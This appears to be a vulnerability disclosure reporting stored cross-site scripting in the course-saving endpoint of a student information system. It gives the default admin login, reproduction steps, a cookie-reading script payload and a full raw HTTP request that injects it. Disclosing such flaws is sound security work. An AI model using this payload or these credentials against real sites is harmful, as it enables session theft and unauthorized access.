BUG_Author:wangshiyou

Vulnerability url: /sis/classes/Master.php?f=save_course

POST form-data parameter name exists stored cross-site scripting

#### Steps to reproduce

1.Go to the admin Login

http://localhost/sis/admin/login.php

Default Admin Access: Username: admin / Password: admin123

2.Click on "Course List" and Click on "+ Add New Course".

3.Put Payload into the Course parameter

Payload:<script>alert(document.cookie)</script>

![image](https://github.com/sssddc11/bug_report/blob/master/xss1.png)

4.Click on Save

Transmission packet

```
POST /sis/classes/Master.php?f=save_course HTTP/1.1
Host: localhost
Content-Length: 557
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryvHu24DiYwx7RUiq4
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
sec-ch-ua-platform: "Windows"
Origin: http://localhost
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost/sis/admin/?page=courses
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=uliaml90ktvaestc2mev4vp09m
Connection: close

------WebKitFormBoundaryvHu24DiYwx7RUiq4
Content-Disposition: form-data; name="id"


------WebKitFormBoundaryvHu24DiYwx7RUiq4
Content-Disposition: form-data; name="department_id"

2
------WebKitFormBoundaryvHu24DiYwx7RUiq4
Content-Disposition: form-data; name="name"

<script>alert(document.cookie)</script>
------WebKitFormBoundaryvHu24DiYwx7RUiq4
Content-Disposition: form-data; name="description"

a
------WebKitFormBoundaryvHu24DiYwx7RUiq4
Content-Disposition: form-data; name="status"

1
------WebKitFormBoundaryvHu24DiYwx7RUiq4--
```

5.Payload will trigger when a user visits on http://localhost/sis/admin/?page=courses

![image](https://github.com/sssddc11/bug_report/blob/master/xss2.png)
